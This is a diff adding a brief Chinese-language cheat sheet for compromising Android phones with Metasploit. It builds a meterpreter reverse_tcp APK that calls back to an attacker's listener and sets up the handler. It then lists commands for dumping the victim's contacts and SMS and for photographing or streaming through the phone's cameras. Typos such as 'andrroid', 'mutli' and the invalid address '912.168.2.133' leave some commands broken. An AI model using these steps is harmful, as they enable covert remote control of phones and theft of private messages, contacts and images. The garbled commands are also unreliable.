@@ -1,0 +1,16 @@
+Android
+生成Androidshellcode
+msfpayload andrroid/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1123 R>/root/Desktop/apk.apk
+
+监听shellcode
+use exploit/mutli/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 912.168.2.133
+set LPORT 1123
+exploit
+dump_contacts    --这个是导出电话
+dump_sms    --这个是导出信息
+Webcam_list 可以看到有几个摄像头
+-i 1是选择后摄像头
+webcam_snap 是拍照
+webcam_stream  开启摄像头
